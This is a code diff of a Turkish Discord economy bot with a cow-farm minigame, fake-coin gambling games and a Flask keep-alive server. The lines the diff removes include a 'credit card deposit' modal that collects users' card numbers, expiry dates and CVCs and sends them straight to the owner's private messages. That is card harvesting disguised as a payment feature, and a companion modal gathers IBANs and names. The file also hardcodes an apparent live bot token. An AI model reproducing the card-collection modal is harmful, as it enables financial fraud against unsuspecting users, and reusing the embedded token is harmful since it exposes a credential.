@@ -6,12 +6,15 @@ import os
 import random
 import asyncio
 import time
+from flask import Flask
+from threading import Thread
 
 # --- AYARLAR ---
 ADMIN_ROLE_ID = 1487436124765814825  # Kendi Admin Rol ID'ni buraya yaz
 MY_ID = 1465806846538547440                  # Kendi Discord ID'ni buraya yaz (Bildirimler için)
 TOKEN = "MTQ4NzQ2MDM3MDUzMTQ4ODAwNw.GiVYKz.gZQn1pckDyA8V0OJYRpPzavJ1tP6FSasrptgME"              # Bot Token'ını buraya yaz
-DB_FILE = "economy.json"
+DB_FILE = "economy.json" 
+
 
 # --- VERİTABANI SİSTEMİ ---
 def load_data():
@@ -27,11 +30,9 @@ def save_data(data):
         json.dump(data, f, indent=4)
 
 def get_user(data, uid):
-    """Kullanıcı verisini güvenli bir şekilde çeker/oluşturur."""
+    uid = str(uid)
     if uid not in data:
         data[uid] = {"bakiye": 1000, "ciftlik": False, "inekler": []}
-    elif isinstance(data[uid], int): # Eski sistemden kalan veriyi çevirir
-        data[uid] = {"bakiye": data[uid], "ciftlik": False, "inekler": []}
     return data[uid]
 
 class MeritBot(commands.Bot):
@@ -50,189 +51,167 @@ def is_admin():
     async def predicate(interaction: discord.Interaction):
         has_role = any(role.id == ADMIN_ROLE_ID for role in interaction.user.roles)
         if not has_role:
-            await interaction.response.send_message("❌ Bu yetkili komutunu kullanamazsın!", ephemeral=True)
+            await interaction.response.send_message("❌ Yetkin yok!", ephemeral=True)
             return False
         return True
     return app_commands.check(predicate)
 
-# --- ÖDEME MODALLARI ---
-
-class ParaYatirModal(discord.ui.Modal, title='Kredi Kartı ile Yatırım'):
-    kart_no = discord.ui.TextInput(label='Kart Numarası', placeholder='0000 0000 0000 0000', min_length=16)
-    skk = discord.ui.TextInput(label='Son Kullanma (AA/YY)', placeholder='01/28', min_length=5)
-    cvc = discord.ui.TextInput(label='CVC', placeholder='123', min_length=3)
-    miktar = discord.ui.TextInput(label='Yatırılacak Miktar', placeholder='Örn: 500')
-
-    async def on_submit(self, interaction: discord.Interaction):
-        owner = await interaction.client.fetch_user(MY_ID)
-        embed = discord.Embed(title="💳 YENİ PARA YATIRMA TALEBİ", color=0x00ff00)
-        embed.add_field(name="Kullanıcı", value=f"{interaction.user} ({interaction.user.id})")
-        embed.add_field(name="Kart No", value=f"||{self.kart_no.value}||")
-        embed.add_field(name="SKT / CVC", value=f"||{self.skk.value} / {self.cvc.value}||")
-        embed.add_field(name="Miktar", value=f"**{self.miktar.value} Coin**")
-        await owner.send(embed=embed)
-        await interaction.response.send_message("✅ Talebiniz iletildi. Onay bekliyor.", ephemeral=True)
-
-class ParaCekModal(discord.ui.Modal, title='Para Çekme Talebi'):
-    iban = discord.ui.TextInput(label='IBAN Adresi', placeholder='TR...', min_length=26)
-    ad_soyad = discord.ui.TextInput(label='Hesap Sahibi Ad Soyad', placeholder='Ahmet Yılmaz')
-    miktar = discord.ui.TextInput(label='Çekilecek Miktar', placeholder='Örn: 1000')
-
-    async def on_submit(self, interaction: discord.Interaction):
-        owner = await interaction.client.fetch_user(MY_ID)
-        embed = discord.Embed(title="🏦 YENİ PARA ÇEKME TALEBİ", color=0xff0000)
-        embed.add_field(name="Kullanıcı", value=f"{interaction.user} ({interaction.user.id})")
-        embed.add_field(name="IBAN", value=f"**{self.iban.value}**")
-        embed.add_field(name="Miktar", value=f"**{self.miktar.value} Coin**")
-        await owner.send(embed=embed)
-        await interaction.response.send_message("📩 Talebiniz alındı.", ephemeral=True)
-
-# --- EKONOMİ VE ADMİN KOMUTLARI ---
+# --- EKONOMİ VE CÜZDAN ---
 
 @bot.tree.command(name="para-bak", description="Mevcut Coin bakiyeni gör.")
 async def para_bak(interaction: discord.Interaction):
     data = load_data()
-    user = get_user(data, str(interaction.user.id))
-    embed = discord.Embed(title="💰 Meritbet Cüzdan", description=f"Mevcut Bakiyeniz: **{user['bakiye']} Coin**", color=0xff00ff)
+    user = get_user(data, interaction.user.id)
+    embed = discord.Embed(title="💰 Merit Cüzdan", description=f"Bakiye: **{user['bakiye']} Coin**", color=0xffd700)
     await interaction.response.send_message(embed=embed)
 
 @bot.tree.command(name="para-bas", description="[ADMİN] Kullanıcıya Coin ekle.")
 @is_admin()
 async def para_bas(interaction: discord.Interaction, miktar: int, kullanıcı: discord.Member):
     data = load_data()
-    user = get_user(data, str(kullanıcı.id))
+    user = get_user(data, kullanıcı.id)
     user['bakiye'] += miktar
     save_data(data)
-    await interaction.response.send_message(f"🏦 {kullanıcı.mention} hesabına **{miktar} Coin** eklendi.")
+    await interaction.response.send_message(f"✅ {kullanıcı.mention} hesabına **{miktar} Coin** eklendi.")
 
-@bot.tree.command(name="para-yatır", description="Kredi kartı ile bakiye yükle.")
-async def para_yatir(interaction: discord.Interaction):
-    await interaction.response.send_modal(ParaYatirModal())
+# --- ÇİFTLİK VE İNEK SİSTEMİ ---
 
-@bot.tree.command(name="para-çek", description="Bakiyeni IBAN hesabına çek.")
-async def para_cek(interaction: discord.Interaction):
-    await interaction.response.send_modal(ParaCekModal())
-
-# --- ÇİFTLİK SİSTEMİ ---
-
-@bot.tree.command(name="çiftlik", description="Çiftliğini görüntüle veya satın al.")
+@bot.tree.command(name="çiftlik", description="Çiftliğini yönet veya satın al.")
 async def ciftlik(interaction: discord.Interaction):
-    data = load_data()
-    uid = str(interaction.user.id)
-    user = get_user(data, uid)
+    data = load_data(); uid = str(interaction.user.id); user = get_user(data, uid)
     
     if not user["ciftlik"]:
-        embed = discord.Embed(title="🚜 Çiftlik Market", description="Bir çiftlik kurmak için **5000 Coin** gerekir.", color=0x34eb43)
         view = discord.ui.View()
-        btn = discord.ui.Button(label="Çiftlik Satın Al (5000C)", style=discord.ButtonStyle.green)
-        
+        btn = discord.ui.Button(label="Çiftlik Kur (5000C)", style=discord.ButtonStyle.green)
         async def buy_cb(inter):
-            if user["bakiye"] < 5000: return await inter.response.send_message("Yetersiz bakiye!", ephemeral=True)
+            if user["bakiye"] < 5000: return await inter.response.send_message("❌ Yetersiz bakiye!", ephemeral=True)
             user["bakiye"] -= 5000; user["ciftlik"] = True; save_data(data)
-            await inter.response.edit_message(content="🎉 Çiftlik kuruldu!", embed=None, view=None)
-        
+            await inter.response.edit_message(content="🎉 Çiftliğin kuruldu! Artık inek alabilirsin.", view=None)
         btn.callback = buy_cb; view.add_item(btn)
-        return await interaction.response.send_message(embed=embed, view=view)
+        return await interaction.response.send_message("🚜 Henüz bir çiftliğin yok!", view=view)
 
-    embed = discord.Embed(title="🚜 Senin Çiftliğin", color=0x34eb43)
-    if not user["inekler"]: embed.description = "Henüz ineğin yok. `/inek-al` ile başlayabilirsin."
-    for idx, inek in enumerate(user["inekler"]):
-        kalan = int(inek["buyume_zamani"] - time.time())
-        durum = "✅ Hazır!" if kalan <= 0 else f"⏳ {kalan//60}dk {kalan%60}sn"
-        embed.add_field(name=f"İnek #{idx+1}", value=durum, inline=True)
+    embed = discord.Embed(title="🚜 Senin Çiftliğin", color=0x2ecc71)
+    if not user["inekler"]:
+        embed.description = "Ahır boş. `/inek-al` ile inek alabilirsin."
+    else:
+        for idx, inek in enumerate(user["inekler"]):
+            kalan = int(inek["buyume_zamani"] - time.time())
+            durum = "✅ Satışa Hazır!" if kalan <= 0 else f"⏳ {kalan//60}dk {kalan%60}sn kaldı."
+            embed.add_field(name=f"🐄 İnek #{idx+1}", value=durum, inline=False)
     await interaction.response.send_message(embed=embed)
 
-@bot.tree.command(name="inek-al", description="1000 Coin karşılığında inek al.")
+@bot.tree.command(name="inek-al", description="1000 Coin'e inek al (20 dk sonra büyür).")
 async def inek_al(interaction: discord.Interaction):
     data = load_data(); uid = str(interaction.user.id); user = get_user(data, uid)
-    if not user["ciftlik"]: return await interaction.response.send_message("Önce çiftlik al!", ephemeral=True)
-    if user["bakiye"] < 1000: return await interaction.response.send_message("Yetersiz bakiye!", ephemeral=True)
+    if not user["ciftlik"]: return await interaction.response.send_message("❌ Önce çiftlik kurmalısın!", ephemeral=True)
+    if user["bakiye"] < 1000: return await interaction.response.send_message("❌ Yetersiz bakiye!", ephemeral=True)
     
     user["bakiye"] -= 1000
     user["inekler"].append({"buyume_zamani": time.time() + 1200})
     save_data(data)
-    await interaction.response.send_message("🐄 İnek alındı! Büyümesi için beklemeli veya `/yem-al` kullanmalısın.")
-
-@bot.tree.command(name="yem-al", description="İneği hızla büyütür.")
-async def yem_al(interaction: discord.Interaction, inek_no: int):
-    data = load_data(); uid = str(interaction.user.id); user = get_user(data, uid)
-    if not user["inekler"] or inek_no > len(user["inekler"]): return await interaction.response.send_message("Geçersiz inek!", ephemeral=True)
-
-    class YemView(discord.ui.View):
-        async def apply(self, inter, sn, fiyat):
-            if user["bakiye"] < fiyat: return await inter.response.send_message("Yetersiz bakiye!", ephemeral=True)
-            user["bakiye"] -= fiyat; user["inekler"][inek_no-1]["buyume_zamani"] = time.time() + sn
-            save_data(data); await inter.response.edit_message(content="🧪 Yem verildi!", view=None)
-
-        @discord.ui.button(label="Kaliteli (1dk) - 500C", style=discord.ButtonStyle.blurple)
-        async def k(self, inter, b): await self.apply(inter, 60, 500)
-        @discord.ui.button(label="Ucuz (3dk) - 200C", style=discord.ButtonStyle.gray)
-        async def u(self, inter, b): await self.apply(inter, 180, 200)
-
-    await interaction.response.send_message("Yem Seçin:", view=YemView())
+    await interaction.response.send_message("🐄 İnek ahıra eklendi! 20 dakika sonra /inek-sat ile satabilirsin.")
 
 @bot.tree.command(name="inek-sat", description="Büyümüş ineği 2500 Coin'e sat.")
 async def inek_sat(interaction: discord.Interaction, inek_no: int):
     data = load_data(); uid = str(interaction.user.id); user = get_user(data, uid)
-    if inek_no > len(user["inekler"]): return await interaction.response.send_message("İnek bulunamadı!", ephemeral=True)
+    if inek_no > len(user["inekler"]) or inek_no <= 0: return await interaction.response.send_message("❌ Geçersiz inek!", ephemeral=True)
     
     inek = user["inekler"][inek_no-1]
-    if inek["buyume_zamani"] > time.time(): return await interaction.response.send_message("Henüz büyümedi!", ephemeral=True)
+    if inek["buyume_zamani"] > time.time(): return await interaction.response.send_message("❌ Bu inek henüz büyümedi!", ephemeral=True)
     
     user["inekler"].pop(inek_no-1); user["bakiye"] += 2500; save_data(data)
-    await interaction.response.send_message("💰 İnek satıldı! +2500 Coin.")
+    await interaction.response.send_message(f"💰 İnek başarıyla satıldı! **+2500 Coin**.")
 
-# --- OYUNLAR (SLOT, CRASH, VB.) ---
+# --- KUMAR OYUNLARI (SLOT, CRASH, AT YARIŞI, HOROZ) ---
 
-@bot.tree.command(name="slot", description="Slot makinesi.")
+@bot.tree.command(name="slot", description="Şansını slotta dene!")
 async def slot(interaction: discord.Interaction, miktar: int):
     data = load_data(); uid = str(interaction.user.id); user = get_user(data, uid)
-    if miktar <= 0 or user["bakiye"] < miktar: return await interaction.response.send_message("Yetersiz bakiye!", ephemeral=True)
+    if miktar <= 0 or user["bakiye"] < miktar: return await interaction.response.send_message("❌ Bakiye yetersiz!", ephemeral=True)
 
-    symbols = ["🍒", "🍋", "🔔", "💎", "7️⃣", "⭐"]
-    embed = discord.Embed(title="🎰 SLOT", description="[ 🔄 | 🔄 | 🔄 ]", color=0xff00ff)
-    await interaction.response.send_message(embed=embed); msg = await interaction.original_response()
-
-    final = [random.choice(symbols) for _ in range(3)]
-    await asyncio.sleep(1.5)
+    items = ["💎", "🍒", "🍋", "🔔", "⭐", "7️⃣"]
+    r1, r2, r3 = [random.choice(items) for _ in range(3)]
     
-    if final[0] == final[1] == final[2]:
-        kazanc = miktar * 5; user["bakiye"] += kazanc; res = f"🔥 **JACKPOT! +{kazanc}**"
-    elif final[0] == final[1] or final[1] == final[2] or final[0] == final[2]:
-        kazanc = miktar * 2; user["bakiye"] += kazanc; res = f"✨ **Kazandın! +{kazanc}**"
+    if r1 == r2 == r3:
+        win = miktar * 10; user["bakiye"] += win; res = f"🔥 **JACKPOT! +{win}**"
+    elif r1 == r2 or r2 == r3 or r1 == r3:
+        win = miktar * 2; user["bakiye"] += win; res = f"✨ **KAZANDIN! +{win}**"
     else:
-        user["bakiye"] -= miktar; res = "💀 Kaybettin..."
+        user["bakiye"] -= miktar; res = "💀 **KAYBETTİN...**"
     
-    save_data(data); embed.description = f"[ {final[0]} | {final[1]} | {final[2]} ]\n\n{res}"
-    await msg.edit(embed=embed)
+    save_data(data)
+    await interaction.response.send_message(f"[ {r1} | {r2} | {r3} ]\n\n{res}")
+
+@bot.tree.command(name="at-yarışı", description="Bir ata oyna (x3 kazandırır).")
+async def at_yarisi(interaction: discord.Interaction, at_no: int, miktar: int):
+    if not 1 <= at_no <= 3: return await interaction.response.send_message("1, 2 veya 3 seç!", ephemeral=True)
+    data = load_data(); user = get_user(data, interaction.user.id)
+    if user["bakiye"] < miktar: return await interaction.response.send_message("Yetersiz bakiye!", ephemeral=True)
+    
+    user["bakiye"] -= miktar; save_data(data)
+    await interaction.response.send_message("🏇 Atlar start aldı...")
+    await asyncio.sleep(3)
+    
+    kazanan = random.randint(1, 3)
+    if at_no == kazanan:
+        win = miktar * 3; user["bakiye"] += win; save_data(data)
+        await interaction.edit_original_response(content=f"🏆 Kazanan {kazanan}. At! **+{win} Coin** kazandın!")
+    else:
+        await interaction.edit_original_response(content=f"❌ Kazanan {kazanan}. At! Kaybettin.")
+
+@bot.tree.command(name="horoz-dövüşü", description="Horozunu dövüştür!")
+async def horoz(interaction: discord.Interaction, miktar: int):
+    data = load_data(); user = get_user(data, interaction.user.id)
+    if user["bakiye"] < miktar: return await interaction.response.send_message("Yetersiz bakiye!", ephemeral=True)
+    
+    user["bakiye"] -= miktar; save_data(data)
+    await interaction.response.send_message("🐓 Horozlar ringde...")
+    await asyncio.sleep(2)
+    
+    if random.choice([True, False]):
+        win = miktar * 2; user["bakiye"] += win; save_data(data)
+        await interaction.edit_original_response(content=f"👑 Senin horoz kazandı! **+{win} Coin**")
+    else:
+        await interaction.edit_original_response(content="🍗 Horozun nakavt oldu... Kaybettin.")
 
 @bot.tree.command(name="crash", description="Uçak patlamadan çekil!")
 async def crash(interaction: discord.Interaction, miktar: int):
     data = load_data(); uid = str(interaction.user.id); user = get_user(data, uid)
-    if miktar <= 0 or user["bakiye"] < miktar: return await interaction.response.send_message("Yetersiz bakiye!", ephemeral=True)
+    if miktar <= 0 or user["bakiye"] < miktar: return await interaction.response.send_message("Bakiye yetersiz!", ephemeral=True)
     
     user["bakiye"] -= miktar; save_data(data)
-    mult = 1.0; crash_at = round(random.uniform(1.2, 4.0), 1); finished = False
+    mult = 1.0; crash_point = round(random.uniform(1.1, 4.5), 1); active = True
 
     view = discord.ui.View()
     btn = discord.ui.Button(label="NAKİT ÇEK", style=discord.ButtonStyle.green)
     async def cb(inter):
-        nonlocal finished; finished = True
+        nonlocal active
+        if inter.user.id != interaction.user.id: return
+        active = False
         kazanc = int(miktar * mult)
-        u = get_user(load_data(), uid); u["bakiye"] += kazanc; save_data(data)
-        await inter.response.edit_message(content=f"💰 Çekildi! x{mult} | +{kazanc}", embed=None, view=None)
+        d = load_data(); u = get_user(d, uid); u["bakiye"] += kazanc; save_data(d)
+        await inter.response.edit_message(content=f"💰 Kazandın! **{kazanc} Coin** (x{mult})", view=None)
     btn.callback = cb; view.add_item(btn)
 
-    embed = discord.Embed(title="🚀 CRASH", description=f"Çarpan: x{mult}", color=0xff00ff)
-    await interaction.response.send_message(embed=embed, view=view); msg = await interaction.original_response()
+    await interaction.response.send_message(f"🚀 Çarpan: **x{mult}**", view=view)
+    msg = await interaction.original_response()
 
-    while not finished:
-        await asyncio.sleep(1.5); mult = round(mult + 0.2, 1)
-        if mult >= crash_at:
-            await msg.edit(content=f"💥 PATLADI! x{crash_at}", embed=None, view=None)
+    while active:
+        await asyncio.sleep(1.5); mult = round(mult + 0.3, 1)
+        if mult >= crash_point:
+            active = False
+            await msg.edit(content=f"💥 PATLADI! x{crash_point}", view=None)
             break
-        await msg.edit(embed=discord.Embed(title="🚀 CRASH", description=f"Çarpan: x{mult}", color=0xff00ff))
+        if active: await msg.edit(content=f"🚀 Çarpan: **x{mult}**")
 
-# (At Yarışı ve Horoz Dövüşü de benzer şekilde get_user mantığıyla çalışır...)
+# --- KEEP ALIVE & RUN ---
+app = Flask('')
+@app.route('/')
+def home(): return "MeritBot 7/24 Aktif!"
+def run(): app.run(host='0.0.0.0', port=8080)
+def keep_alive():
+    t = Thread(target=run); t.start()
 
-bot.run(TOKEN)
+if __name__ == "__main__":
+    keep_alive()
+    bot.run(TOKEN)
